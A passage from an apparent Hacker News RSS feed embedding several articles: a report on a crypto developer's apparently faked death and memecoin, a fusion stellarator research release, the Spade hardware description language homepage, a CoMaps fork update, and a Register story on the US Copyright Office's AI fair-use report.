for the company denied the event had taken place on its site, calling it “nothing more than a social narrative circulating on X” and “an edited&nbsp;fabrication” in a statement Friday.</p></div><div><p>That full video is no longer available, but snippets are circulating. His obituary, which called him a “Martyr of Imagination and Creativity,” is no longer on Legacy.com.</p><p>“His life, though brief, was lived with intensity, brilliance, and a devotion to creation that he hoped would inspire others for eternity,” the article said.</p></div><div><p>It’s unclear if the other details about Yu’s life can be trusted. The online memorial said he studied computer science at Stanford and attended Northeastern and Arizona State. He reportedly worked full-time as a software engineer in Santa Cruz. His <a href="https://www.linkedin.com/in/jeffyyu/">LinkedIn profile</a> says the same.</p><p>Dressed in a T-shirt, shorts, flip-flops, and wire-rimmed glasses, Yu declined to talk about the false report of his death or how he may have benefited financially from it.</p><p>“You can see the PTSD in my eyes, right?” he said before telling this reporter to leave.</p><p>Although the obituary touted his alleged successes, the more significant self-tribute was Sunday’s release of a memecoin that one of his social media accounts <a href="https://mirror.xyz/jyu.eth/8vyuJuDkAOBmFvPmVy3QWdThtqDiQdg76llPH9IGmGM">promoted</a> in what claimed to be an automated message. “If you’re reading this, it’s because my 72 hour deadman’s switch triggered so i’m not here, at least physically,” the message said. The message described the new coin, dubbed $LLJEFFY, as “my final art piece” and “an eternal grave in cyberspace.”</p></div><figure id=""><div><p><span><span></span><img alt="The image is a halftone portrait of a person with blue and orange tones, featuring their head and shoulders and a neutral expression." loading="lazy" decoding="async" data-nimg="responsive" sizes="(min-width: 1001px) 600px, (min-width: 768px) 700px, 100vw" srcset="https://content.sfstandard.com/wp-content/uploads/2025/05/jyu_04.jpg?w=640&amp;q=75 640w, https://content.sfstandard.com/wp-content/uploads/2025/05/jyu_04.jpg?w=750&amp;q=75 750w, https://content.sfstandard.com/wp-content/uploads/2025/05/jyu_04.jpg?w=768&amp;q=75 768w, https://content.sfstandard.com/wp-content/uploads/2025/05/jyu_04.jpg?w=828&amp;q=75 828w, https://content.sfstandard.com/wp-content/uploads/2025/05/jyu_04.jpg?w=1024&amp;q=75 1024w, https://content.sfstandard.com/wp-content/uploads/2025/05/jyu_04.jpg?w=1080&amp;q=75 1080w, https://content.sfstandard.com/wp-content/uploads/2025/05/jyu_04.jpg?w=1200&amp;q=75 1200w, https://content.sfstandard.com/wp-content/uploads/2025/05/jyu_04.jpg?w=1920&amp;q=75 1920w, https://content.sfstandard.com/wp-content/uploads/2025/05/jyu_04.jpg?w=2048&amp;q=75 2048w, https://content.sfstandard.com/wp-content/uploads/2025/05/jyu_04.jpg?w=3840&amp;q=75 3840w" src="https://content.sfstandard.com/wp-content/uploads/2025/05/jyu_04.jpg?w=3840&amp;q=75" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></span></p></div><figcaption><span><span>Source: </span>Photo Illustration by The Standard</span></figcaption></figure><div><p>Suspicions emerged quickly when cryptocurrency figures, including Wonderland CEO Daniele Sestagalli, claimed Yu had faked his death. Sestagalli published what he described as a private letter from Yu stating that the “suicide” was “my only viable exit from persistent harassment, blackmail and threats” and that he had to “definitively and permanently disengage.” Attempts to reach Sestagalli were unsuccessful.&nbsp;</p><p>On-chain analysis shared on social media by Bubblemaps, a crypto analytics platform, <a href="https://x.com/bubblemaps/status/1920054468567265306">showed</a> accounts linked to Yu moving up to $1.4 million in cryptocurrency after his supposed death. Several accounts accused Yu of orchestrating an elaborate “pseudocide exit strategy” to cash out his holdings.</p><p>Before his staged death, Yu published a <a href="https://mirror.xyz/jyu.eth/Ekd5RjVGhygQUHUSECslOqzxsoNF9eAKjqGwQ2PCoJU">manifesto</a> introducing the concept of “legacoins” — described as an “evolution of digital assets commonly referred to as memecoins” that function as “a vault or storage, securing and preserving value indefinitely.”</p><p>New, confusing messages about Yu continue to arise. Early Thursday, the X account @eiuge74698713 announced that it would hold “a unique blockchain funeral event” for Yu.</p><p>“A true believer and builder of blockchain, someone who upheld his life’s belief even in death,” <a href="https://x.com/eiuge74698713/status/1920445385522483298">the account said</a>. “He deserves to be honored in a uniquely blockchain way.”</p><p><em>If you or someone you know may be struggling with suicidal thoughts, call or text “988,” day or night, to reach the Suicide and Crisis Lifeline, or </em><a href="https://suicidepreventionlifeline.org/chat/"><em>chat online</em></a><em>.</em></p></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[CrowdStrike CEO cuts his voting power by 92% with unexplained gifts (120 pts)]]></title>
            <link>https://www.bloomberg.com/news/articles/2025-05-12/billionaire-crowdstrike-ceo-cuts-voting-power-by-92-with-unexplained-gifts</link>
            <guid>43962207</guid>
            <pubDate>Mon, 12 May 2025 12:30:16 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.bloomberg.com/news/articles/2025-05-12/billionaire-crowdstrike-ceo-cuts-voting-power-by-92-with-unexplained-gifts">https://www.bloomberg.com/news/articles/2025-05-12/billionaire-crowdstrike-ceo-cuts-voting-power-by-92-with-unexplained-gifts</a>, See on <a href="https://news.ycombinator.com/item?id=43962207">Hacker News</a></p>
Couldn't get https://www.bloomberg.com/news/articles/2025-05-12/billionaire-crowdstrike-ceo-cuts-voting-power-by-92-with-unexplained-gifts: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[University of Texas-led team solves a big problem for fusion energy (206 pts)]]></title>
            <link>https://news.utexas.edu/2025/05/05/university-of-texas-led-team-solves-a-big-problem-for-fusion-energy/</link>
            <guid>43962148</guid>
            <pubDate>Mon, 12 May 2025 12:21:33 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://news.utexas.edu/2025/05/05/university-of-texas-led-team-solves-a-big-problem-for-fusion-energy/">https://news.utexas.edu/2025/05/05/university-of-texas-led-team-solves-a-big-problem-for-fusion-energy/</a>, See on <a href="https://news.ycombinator.com/item?id=43962148">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
      
      <p><img src="https://news.utexas.edu/wp-content/themes/texas-timber-theme/assets/images/two-tone-bar-orange.svg" width="100%" height="8px" alt="Two color orange horizontal divider">
      </p>
            <figure>
      <picture>
        <source media="(min-width: 800px)" srcset="https://news.utexas.edu/wp-content/uploads/2025/05/FigCove_2400x1600-1200x800-c-default.jpg 1000w">
        <source srcset="https://news.utexas.edu/wp-content/uploads/2025/05/FigCove_2400x1600-600x400-c-default.jpg">
        <img src="https://news.utexas.edu/wp-content/uploads/2025/05/FigCove_2400x1600-600x400-c-default.jpg" srcset="https://news.utexas.edu/wp-content/uploads/2025/05/FigCove_2400x1600-600x400-c-default.jpg, https://news.utexas.edu/wp-content/uploads/2025/05/FigCove_2400x1600-1200x800-c-default.jpg 1000w" alt="FigCove_2400x1600">
      </picture>

                  <figcaption>
            
                        <p>Predicted motions of hundreds of particles in a fusion reactor. The motions predicted with the new method (orange, red) agree very closely with those predicted by Newton’s laws (blue, green), but can be calculated 10 times faster. Image credit: University of Texas at Austin.</p>
                      </figcaption>
              </figure>
          </div><div>
              <p>AUSTIN, Texas —&nbsp;&nbsp;Abundant, low-cost, clean energy — the envisioned result if scientists and engineers can successfully produce a reliable method of generating and sustaining fusion energy — took one step closer to reality, as a team of researchers from The University of Texas at Austin, Los Alamos National Laboratory and Type One Energy Group solved a longstanding problem in the field.</p>
<p>One of the big challenges holding fusion energy back has been the ability to contain high-energy particles inside fusion reactors. When high-energy alpha particles leak from a reactor, that prevents the plasma from getting hot and dense enough to sustain the fusion reaction. To prevent them from leaking, engineers design elaborate magnetic confinement systems, but there are often holes in the magnetic field, and a tremendous amount of computational time is required to predict their locations and eliminate them.</p>
<p>In their paper published in <a title="https://nam12.safelinks.protection.outlook.com/?url=https%3A%2F%2Flink.mediaoutreach.meltwater.com%2Fls%2Fclick%3Fupn%3Du001.lc-2BFR9kAGx6vaMgb07fkaMjnkWuiKrfDPYs9U37d97GxzSVnYs5jWkFcAwKellUknkU81axC8zVnqoRLvHqnhINkYMOzwXIk10XauIIdrXE-3Dyk2O_8BF4G2ZegHPgRC6-2FNZpyCY649U4y59HXJQeVXTd8sRZo1GlBfXq2jip5xy-2Bfob-2BiGg3VVi8yRj-2BJSqwM37AE8yDyakLlDubekOWmDqARtcaOIa4j1DKQ5TRzgsUkHpCGqDwlDJi4yDL6W4Cs1eTe8-2F-2B7Z0g965pEUfT-2B9e1j8utPBKIfYCAMZQMu3GRUY2-2Fj-2FwtqysbeXne3cGJK-2B1YDTMhnMYgknNyEEnW0bplgZu4zuftcstQiWkkTVVrkIN1teTiF5K5kZq0UZgx8ZjyBeq9mdSqDBk-2BqAIVxxt-2Blyx-2B1Ovz1nOT84xGI-2BvUh8r-2BxQewzhxoNN5EGkJ0Nga17NOi665AjWnLHG0a2iExFrMC1BskiUgGRzsbhZZtIZYHmSOKAwQZ-2BPgQvgiPbTfr-2Bag-3D-3D&amp;data=05%7C02%7C%7C5dea2fabd2b14c13bb1108dd8bf466dd%7C31d7e2a5bdd8414e9e97bea998ebdfe1%7C0%7C0%7C638820604031662564%7CUnknown%7CTWFpbGZsb3d8eyJFbXB0eU1hcGkiOnRydWUsIlYiOiIwLjAuMDAwMCIsIlAiOiJXaW4zMiIsIkFOIjoiTWFpbCIsIldUIjoyfQ%3D%3D%7C0%7C%7C%7C&amp;sdata=efGku7Y9hZvkNT7xNQV8C1KEOwjoMeHjDFpk1hp3EjI%3D&amp;reserved=0" href="https://journals.aps.org/prl/abstract/10.1103/PhysRevLett.134.175101" data-outlook-id="b9cbe77f-93b9-479c-b437-512f817cfd40">Physical Review Letters</a>, the research team describes having discovered a shortcut that can help engineers design leak-proof magnetic confinement systems 10 times as fast as the gold standard method, without sacrificing accuracy. While several other big challenges remain for all magnetic fusion designs, this advance addresses the biggest challenge that’s specific to a type of fusion reactor first proposed in the 1950s, called a stellarator.</p>
<p>“What’s most exciting is that we’re solving something that’s been an open problem for almost 70 years,” said Josh Burby, assistant professor of physics at UT and first author of the paper. “It’s a paradigm shift in how we design these reactors.”</p>
<p>A stellarator uses external coils carrying electric currents that generate magnetic fields to confine a plasma and high-energy particles. This confinement system is often described as a “magnetic bottle.”</p>
<p>There is a way to identify where the holes are in the magnetic bottle using Newton’s laws of motion, which is very precise but takes an enormous amount of computational time. Worse still, to design a stellarator, scientists might need to simulate hundreds or thousands of slightly different designs, tweaking the layout of the magnetic coils and iterating to eliminate the holes — a process that would require a prohibitive amount of computation on top of that.</p>
<p>So, to save time and money, scientists and engineers routinely use a simpler method for approximating where the holes are, using an approach called perturbation theory. But that method is much less accurate, which has slowed the development of stellarators. The new method relies on symmetry theory, a different way of understanding the system.</p>
<p>“There is currently no practical way to find a theoretical answer to the alpha-particle confinement question without our results,” Burby said. “Direct application of Newton’s laws is too expensive. Perturbation methods commit gross errors. Ours is the first theory that circumvents these pitfalls.”</p>
<p>This new method also can help with a similar but different problem in another popular magnetic fusion reactor design called a tokamak. In that design, there’s a problem with runaway electrons — high-energy electrons that can punch a hole in the surrounding walls. This new method can help identify holes in the magnetic field where these electrons might leak.</p>
<p>Burby’s co-authors from UT are postdoctoral researcher Max Ruth and graduate student Ivan Maldonado. Other authors are Dan Messenger, a postdoctoral fellow at Los Alamos, and Leopoldo Carbajal, a computational scientist and data scientist at Type One Energy Group, a company planning to build stellarators for power generation.</p>
<p>This work was supported by the U.S. Department of Energy.</p>

            </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Spade Hardware Description Language (101 pts)]]></title>
            <link>https://spade-lang.org/</link>
            <guid>43962138</guid>
            <pubDate>Mon, 12 May 2025 12:19:50 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://spade-lang.org/">https://spade-lang.org/</a>, See on <a href="https://news.ycombinator.com/item?id=43962138">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
  
<p>Spade is a new hardware description language which makes hardware
description easier and less error-prone. It does this by taking lessons from
software programming languages, and adding language level support for common
hardware constructs, all without compromising low level control over what
hardware gets generated.</p>
<h2 id="key-features">Key Features</h2>
<h3 id="language-level-pipelines">Language Level Pipelines</h3>
<p>Pipelines are a first class construct in Spade, making re-timing and
re-pipelining trivial. The <code>reg</code> separates code into stages, meaning you never
have to manually define pipeline registers, and that behavior is separated
from physical implementation.</p>
<p>When you need to update your design to meet timing, you can simply add or move
<code>reg</code> statements. The compiler is
smart enough to figure out when these changes affect the timing of instantiating
modules and tells you where to update your code to keep the original behavior.</p>
<pre data-lang="spade"><code data-lang="spade"><span>pipeline</span><span>(</span><span>4</span><span>) X(clk</span><span>:</span><span> clk</span><span>,</span><span> a</span><span>: </span><span>int&lt;32&gt;</span><span>,</span><span> b</span><span>: </span><span>int&lt;32&gt;) </span><span>-&gt; </span><span>int&lt;64&gt; {
</span><span>        </span><span>let</span><span> product </span><span>=</span><span> a </span><span>*</span><span> b</span><span>;
</span><span>    </span><span>reg </span><span>* </span><span>3</span><span>;
</span><span>        </span><span>let</span><span> result </span><span>= </span><span>f</span><span>(a</span><span>,</span><span> product)</span><span>;
</span><span>    </span><span>reg</span><span>;
</span><span>        result
</span><span>}
</span></code></pre>
<p>For more complex pipelines with feedback, such as a processor data path,
re-timing becomes less trivial, but being able to reason about signals in
stages instead of individual registers is still very helpful.</p>
<h3 id="types-and-enums">Types and Enums</h3>
<p>Spade has a powerful type system with structs, arrays, tuples and <em>sum types</em>
called <code>enums</code>.
A strong type system makes interoperability with external or internal modules
easier, and means you can refactor your code with confidence. The compiler will
tell you where your changes affect the behavior of your code.</p>
<p>Enums are of particular importance: unlike the enums of C and Verilog, they can
have associated payload.</p>
<p>You can model a value which may or may not be available with the <code>Option</code> enum:</p>
<pre data-lang="spade"><code data-lang="spade"><span>enum </span><span>Option</span><span>&lt;T&gt; {
</span><span>    </span><span>Some</span><span>(val</span><span>:</span><span> T)</span><span>,
</span><span>    </span><span>None
</span><span>}
</span></code></pre>
<p>Or why not model the instruction set of a CPU?</p>
<pre data-lang="spade"><code data-lang="spade"><span>enum </span><span>Insn </span><span>{
</span><span>    Set { dreg</span><span>: </span><span>int&lt;5&gt;</span><span>,</span><span> val</span><span>: </span><span>int&lt;32&gt; }</span><span>,
</span><span>    Add { dreg</span><span>: </span><span>int&lt;5&gt;</span><span>,</span><span> lhs</span><span>: </span><span>int&lt;5&gt;</span><span>,</span><span> rhs</span><span>: </span><span>int&lt;5&gt; }</span><span>,
</span><span>    Sub { dreg</span><span>: </span><span>int&lt;5&gt;</span><span>,</span><span> lhs</span><span>: </span><span>int&lt;5&gt;</span><span>,</span><span> rhs</span><span>: </span><span>int&lt;5&gt; }</span><span>,
</span><span>    Jump { target</span><span>: </span><span>int&lt;32&gt; }
</span><span>}
</span></code></pre>
<p>The compiler ensures that fields can only be accessed if the value is of the
correct type. For example, if the instruction is a <code>Jump</code>, there is no way to
access a <code>dreg</code> field.</p>
<h3 id="pattern-matching">Pattern Matching</h3>
<p>Enums work really well with pattern matching which allows you to check
conditions and easily bind sub-values to variables.</p>
<p>You can easily build an ALU:</p>
<pre data-lang="spade"><code data-lang="spade"><span>fn </span><span>alu</span><span>(</span><span>insn</span><span>:</span><span> Insn, </span><span>rs1</span><span>: </span><span>int&lt;32&gt;, </span><span>rs2</span><span>: </span><span>int&lt;32&gt;) </span><span>-&gt; </span><span>int&lt;32&gt; {
</span><span>    </span><span>let</span><span> adder_result </span><span>= </span><span>match</span><span> insn {
</span><span>        Insn</span><span>::</span><span>Add(</span><span>_</span><span>, </span><span>_</span><span>, </span><span>_</span><span>) </span><span>=&gt;</span><span> rs1 </span><span>+</span><span> rs2</span><span>,
</span><span>        Insn</span><span>::</span><span>Sub(</span><span>_</span><span>, </span><span>_</span><span>, </span><span>_</span><span>) </span><span>=&gt;</span><span> rs1 </span><span>-</span><span> rs2</span><span>,
</span><span>        Insn</span><span>::</span><span>Set(</span><span>_</span><span>,</span><span> val) </span><span>=&gt; </span><span>sext</span><span>(val)</span><span>,
</span><span>        Insn</span><span>::</span><span>Jump(</span><span>_</span><span>) </span><span>=&gt; </span><span>0</span><span>,
</span><span>    }</span><span>;
</span><span>
</span><span>    </span><span>trunc</span><span>(adder_result)
</span><span>}
</span></code></pre>
<p>Or select the first of two values, and 0 if none are present:</p>
<pre data-lang="spade"><code data-lang="spade"><span>let</span><span> result </span><span>= </span><span>match </span><span>(a</span><span>,</span><span> b) {
</span><span>    (</span><span>Some </span><span>(x)</span><span>, </span><span>_</span><span>) </span><span>=&gt;</span><span> x</span><span>,
</span><span>    (</span><span>_</span><span>, </span><span>Some</span><span>(x)) </span><span>=&gt;</span><span> x</span><span>,
</span><span>    </span><span>_ =&gt; </span><span>0
</span><span>}
</span></code></pre>
<p>The compiler makes sure that all cases are covered. For example, if you add a
new instruction to the <code>Insn</code> type, it will force you to deal with that case in
the ALU.</p>
<h3 id="type-inference">Type inference</h3>
<p>Spade has powerful type inference which gives you the benefits of static types,
without all the typing.</p>
<h3 id="great-error-messages">Great Error Messages</h3>
<p>The compiler should be your friend. Error messages give you as much information
as possible</p>
<pre data-lang="text"><code data-lang="text"><span>error: Match branches have incompatible type
</span><span>30 +-Insn::Add(_, _, _) =&gt; rs1 + rs2,
</span><span>   |                       ^^^^^^^^^
</span><span>   |                       This branch has type int&lt;33&gt;
</span><span>32 | Insn::Set(_, val) =&gt; val,
</span><span>   |                      ^^^ But this one has type int&lt;32&gt;
</span><span>   |
</span><span>   = Expected: 33 in: int&lt;33&gt;
</span><span>   =      Got: 32 in: int&lt;32&gt;
</span></code></pre>
<p>Bad error messages are considered a bug. Please report them!</p>
<h3 id="helpful-tooling">Helpful tooling</h3>
<p>Spade comes with a great set of tools around the language</p>
<ul>
<li>The official build tool <a href="https://gitlab.com/spade-lang/swim">Swim</a> manages
your dependencies, calls synthesis tools and runs your tests. It can even
create a new project for you with a single command!
<ul>
<li>Of course you can put the generated Verilog into your regular build flow
as well.</li>
</ul>
</li>
<li>Tests are written in <a href="https://www.cocotb.org/">cocotb</a> allowing you to take
advantage of python for all your testing needs. When you need higher
performance tests, you can also use <a href="https://verilator.org/">verilator</a></li>
<li>VCDs coming out of tests are automatically translated to include Spade type
information so you never have to decode individual bits in your waveform.</li>
</ul>
<h3 id="planned-features">Planned features</h3>
<p>There are also some planned features:</p>
<ul>
<li>Integer ranges as types.</li>
<li>Generics with traits</li>
<li>Clock domain information on types.
<ul>
<li>Mixing domains without explicit synchronization is a compilation error.</li>
<li>Related: clock domain inference where the domain is obvious.</li>
</ul>
</li>
<li>And more...</li>
</ul>
<h2 id="using-spade">Using Spade</h2>
<p>To get started, read the (work in progress) <a href="https://docs.spade-lang.org/">spade book</a>.</p>
<p>For an overview of what Spade is, have a look at this
<a href="https://www.youtube.com/watch?v=N6GiefZDhss">talk from OSDA 2023</a>.
Documentation is very much a work in progress, but some is available in our
<a href="https://docs.spade-lang.org/">book</a>.</p>
<p>Spade is in its early stages, so everything is subject to change. You can build
things with it but be prepared for bugs and missing features.</p>
<h3 id="learn-more">Learn more</h3>
<p>Feel free to follow the development either on <a href="https://gitlab.com/spade-lang/spade/">Gitlab</a>
or in our <a href="https://discord.gg/YtXbeamxEX">Discord community server</a>.</p>
<h2 id="publications">Publications</h2>
<p>To cite Spade itself, use the <a href="https://zenodo.org/record/7713114">zenodo record</a>.</p>
<ul>
<li><a href="https://orcid.org/0000-0001-7089-9697">Frans Skarman</a>, <a href="https://orcid.org/0000-0002-2571-1058">Lucas Klemmer</a> <a href="https://orcid.org/0000-0003-3470-3911">Oscar Gustafsson</a> <a href="https://orcid.org/0000-0002-1490-6175">Daniel Große</a>.
<a href="https://spade-lang.org/fdl2023.pdf"><strong>Enhancing Compiler-Driven HDL Design with Automatic Waveform Analysis</strong></a>.
September 2023. In: <em>Forum on specification &amp; Design Languages (FDL)</em>.  
</li>
<li><a href="https://orcid.org/0000-0001-7089-9697">Frans Skarman</a>, <a href="https://orcid.org/0000-0003-3470-3911">Oscar Gustafsson</a>.
<a href="https://doi.org/10.48550/arXiv.2304.03079"><strong>Spade: An Expression-Based HDL With Pipelines</strong></a>.
April 2023. In: <em>3rd Workshop on Open-Source Design Automation (OSDA)</em>.  
</li>
<li><a href="https://orcid.org/0000-0001-7089-9697">Frans Skarman</a>, <a href="https://orcid.org/0000-0003-3470-3911">Oscar Gustafsson</a>.
<a href="https://capra.cs.cornell.edu/latte23/paper/2.pdf"><strong>Abstraction in the Spade Hardware Description Language</strong></a>.
March 2023. In: <em>3rd Workshop on Languages, Tools, and Techniques for Accelerator Design (LATTE)</em>.  
</li>
<li><a href="https://orcid.org/0000-0001-7089-9697">Frans Skarman</a>, <a href="https://orcid.org/0000-0003-3470-3911">Oscar Gustafsson</a>.
<a href="https://doi.org/10.1109/FPL57034.2022.00075"><strong>Spade: An HDL Inspired by Modern Software Languages</strong></a>.
August 2022. In: <em>32nd International Conference on Field-Programmable Logic and Applications (FPL)</em>.  
</li>
</ul>
<h2 id="talks">Talks</h2>
<ul>
<li><a href="https://orcid.org/0000-0001-7089-9697">Frans Skarman</a>
<a href="https://spade-lang.org/latchup24.pdf"><strong>Spade - An HDL Inspired by Modern Software Languages</strong></a>.
May 2024. At: <em>LatchUp 2024</em>.  
</li>
</ul>
<h2 id="development">Development</h2>
<!-- TODO: Is this nice to screen readers? -->
<p><a href="https://liu.se/en/organisation/liu/isy">
    <img src="https://spade-lang.org/liu-primary-black.svg" alt="Linköping University logo">
    <img src="https://spade-lang.org/liu-primary-white.svg" alt="Linköping University logo">
</a></p><p>Spade is currently being developed as an Open Source project at the
<a href="https://liu.se/en/organisation/liu/isy/da">Division of Computer Engineering</a>,
<a href="https://liu.se/en/organisation/liu/isy">Department of Electrical Engineering</a>,
<a href="https://liu.se/">Linköping University</a>, Sweden.</p>
<h2 id="license">License</h2>
<p>The Spade compiler and other tooling is licensed under the <a href="https://gitlab.com/spade-lang/spade/-/blob/master/LICENSE-EUPL-1.2.txt">EUPL-1.2
license</a>.
The Spade standard library and this website is licensed under the terms of both
the <a href="https://gitlab.com/spade-lang/spade/-/blob/master/MIT%20License">MIT
license</a> and
the <a href="https://gitlab.com/spade-lang/spade/-/blob/master/LICENSE-APACHE2.0.txt">Apache
license</a>.</p>

</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[A community-led fork of Organic Maps (268 pts)]]></title>
            <link>https://www.comaps.app/news/2025-05-12/3/</link>
            <guid>43961908</guid>
            <pubDate>Mon, 12 May 2025 11:40:24 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.comaps.app/news/2025-05-12/3/">https://www.comaps.app/news/2025-05-12/3/</a>, See on <a href="https://news.ycombinator.com/item?id=43961908">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
            <p><em>This is a copy of the update to the <strong>Open Letter to Organic Maps Shareholders</strong> from <a rel="noopener" target="_blank" href="https://openletter.earth/open-letter-to-organic-maps-shareholders-a0bf770c">openletter.earth</a>:</em></p>
<hr>
<p>Work on a community fork is progressing rapidly!</p>
<p>The project's core principles are <strong>Transparency, Community Decision-making, Not-for-profit &amp; for Public Interest, Fully Open Source and Privacy-focused</strong>. Read more about the project's essence and direction at our new "home" at <a rel="noopener" target="_blank" href="https://codeberg.org/comaps">https://codeberg.org/comaps</a>.</p>
<p>The project has a strong start! And now we are focusing on building the foundation, setting up the technology, and many areas are in-progress. Work is continuing on the first release!</p>
<p>The name for the project - <em>CoMaps (community, collaborative, common, collective, etc.)</em> - is provisional. We think it's a good one, but would like more people in the community to take part in choosing the final name together!</p>
<p><strong>The project name voting</strong> happens <a rel="noopener" target="_blank" href="https://codeberg.org/comaps/Governance/issues/34">here</a> and <strong>will conclude on May 20th.</strong>
Sign into Codeberg to vote or suggest a name. People are already signing up in Codeberg to get involved and contribute on the project (including discussing features and reporting bugs).</p>
<p>CoMaps is a community-driven project, here is <strong>how to get involved:</strong></p>
<ul>
<li>Join the development effort <a rel="noopener" target="_blank" href="https://codeberg.org/comaps/comaps">on Codeberg</a> (there are many things to do, even just fixing and updating the docs is an important task)</li>
<li>Join organizational and decisions-making activities <a rel="noopener" target="_blank" href="https://codeberg.org/comaps/Governance">in our Governance repo</a></li>
<li>Spread the word!</li>
<li>Get in touch if you'd like to help with texts and graphics for social media promotion</li>
<li>Help build our website in <a rel="noopener" target="_blank" href="https://codeberg.org/comaps/website">our Website repo</a> (check the preview <a rel="noopener" target="_blank" href="https://www.comaps.app/">comaps.app</a>)</li>
<li>Donate at <a rel="noopener" target="_blank" href="https://opencollective.com/comaps/donate">OpenCollective</a> (all donations and spending are handled transparently by Open Collective)</li>
</ul>
<p>In the next update we'll announce the final project name!</p>
<hr>
<p>There was no real progress in negotiations with Organic Maps shareholders.</p>
<p>It appears that Viktor is only open to a guarantee not to sell the project, however besides that he wants to retain full control of Organic Maps.</p>
<p>And Organic Maps future is uncertain still, as the disagreement between shareholders (Viktor and Roman) has not been resolved.</p>

          </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[US Copyright Office found AI companies breach copyright. Its boss was fired (409 pts)]]></title>
            <link>https://www.theregister.com/2025/05/12/us_copyright_office_ai_copyright/</link>
            <guid>43961247</guid>
            <pubDate>Mon, 12 May 2025 09:49:10 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.theregister.com/2025/05/12/us_copyright_office_ai_copyright/">https://www.theregister.com/2025/05/12/us_copyright_office_ai_copyright/</a>, See on <a href="https://news.ycombinator.com/item?id=43961247">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="body">
<p>The head of the US Copyright Office has reportedly been fired, the day after agency concluded that builders of AI models use of copyrighted material went beyond existing doctrines of fair use.</p>
<p>The office’s opinion on fair use came in a draft of the third part of its report on copyright and artificial intelligence. The first part considered digital replicas and the second tackled whether it is possible to copyright the output of generative AI.</p>
<p>The office published the <a target="_blank" rel="nofollow" href="https://www.copyright.gov/ai/Copyright-and-Artificial-Intelligence-Part-3-Generative-AI-Training-Report-Pre-Publication-Version.pdf">draft</a> [PDF] of Part 3, which addresses the use of copyrighted works in the development of generative AI systems, on May 9th.</p>
<div><p><img src="https://regmedia.co.uk/2024/02/16/ai_shutterstock.jpg?x=174&amp;amp;y=115&amp;amp;crop=1" width="174" height="115" alt="AI"></p><h2 title="Recently formed AI Preferences Working Group has August deadline to develop ideas on how to tell crawlers to go away, or come for a feast">Copyright-ignoring AI scraper bots laugh at robots.txt so the IETF is trying to improve it</h2>
<p><a href="https://www.theregister.com/2025/04/09/ietf_ai_preferences_working_group/"><span>READ MORE</span></a></p></div>
<p>The draft notes that generative AI systems “draw on massive troves of data, including copyrighted works” and asks: “Do any of the acts involved require the copyright owners’ consent or compensation?”</p>
<p>That question is the subject of <a target="_blank" href="https://www.theregister.com/2025/01/10/meta_libgen_allegation/">several lawsuits</a>, because developers of AI models have admitted to training their products on content scraped from the internet and other sources without compensating content creators or copyright owners. AI companies have argued fair use provisions of copyright law mean they did no wrong.</p>

    

<p>As the report notes, one test courts use to determine fair use considers “the effect of the use upon the potential market for or value of the copyrighted work”. If a judge finds an AI company’s use of copyrighted material doesn’t impact a market or value, fair use will apply.</p>

        


        

<p>The report finds AI companies can’t sustain a fair use defense in the following circumstances:</p>

<p>The office will soon publish a final version of Part 3 that it expects will emerge “without any substantive changes expected in the analysis or conclusions.”</p>
<p>Tech law professor Blake. E Reid <a target="_blank" rel="nofollow" href="https://bsky.app/profile/chup.blakereid.org/post/3lot4e7onuk2m">described</a> the report as “very bad news for the AI companies in litigation” and “A straight-ticket loss for the AI companies”.</p>
<p>Among the AI companies currently in litigation on copyright matters are Google, Meta, OpenAI, and Microsoft. All four made donations to Donald Trump’s inauguration fund.</p>

        

<p>Reid’s post also pondered the timing of the Part 3 report – despite the office saying it was released “in response to congressional inquiries and expressions of interest from stakeholders” – and wrote “I continue to wonder (speculatively!) if a purge at the Copyright Office is incoming and they felt the need to rush this out.”</p>
<p>Reid looks prescient as the Trump administration <a target="_blank" rel="nofollow" href="https://www.nbcbayarea.com/news/national-international/trump-administration-fires-top-copyright-official/3866143/">reportedly</a> fired the head of the Copyright Office, Shira Perlmutter, on Saturday.</p>
<ul>

<li><a href="https://www.theregister.com/2025/04/22/bad_trip_coming_for_ai/">Bad trip coming for AI hype as humanity tools up to fight back</a></li>

<li><a href="https://www.theregister.com/2025/05/09/tech_titans_wanna_secure_us/">Tech titans: Wanna secure US AI leadership? Stop giving the world excuses to buy Chinese</a></li>

<li><a href="https://www.theregister.com/2025/04/29/take_it_down_act_passes/">TAKE IT DOWN Act? Yes, take the act down before it's too late for online speech</a></li>

<li><a href="https://www.theregister.com/2025/04/03/blair_institute_ai_copyright/">On the issue of AI copyright, Blair Institute favors tech bros over Cool Britannia</a></li>
</ul>
<p>Representative Joe Morelle (D-NY), <a target="_blank" rel="nofollow" href="https://democrats-cha.house.gov/media/press-releases/morelles-statement-abrupt-firing-shira-perlmutter-register-copyrights">wrote</a> the termination was “…surely no coincidence he acted less than a day after she refused to rubber-stamp Elon Musk’s efforts to mine troves of copyrighted works to train AI models.”</p>
<p>Morelle linked the words “she refused to rubber-stamp” to the Part 3 report discussed above.</p>
<p>The remarks about Musk may refer to the billionaire’s recent endorsement of Twitter founder Jack Dorsey’s <a target="_blank" href="https://www.theregister.com/2025/04/22/bad_trip_coming_for_ai/">desire</a> to “Delete all IP law", or the Tesla and SpaceX boss’s plans to <a target="_blank" href="https://www.theregister.com/2025/04/14/ireland_investigation_into_x/">train his own “Grok” AI</a> on X users’ posts.</p>

        

<p>There’s another possible explanation for Perlmutter’s ousting: The Copyright Office is a department of the Library of Congress, whose leader was last week fired on grounds of “quite concerning things that she had done … in the pursuit of DEI [diversity, equity, and inclusion] and putting inappropriate books in the library for children," according to White House press secretary Karoline Leavitt.</p>
<p>So maybe this is just the Trump administration enacting its policy on diversity without regard to the report’s possible impact on donors or Elon Musk. ®</p>                                
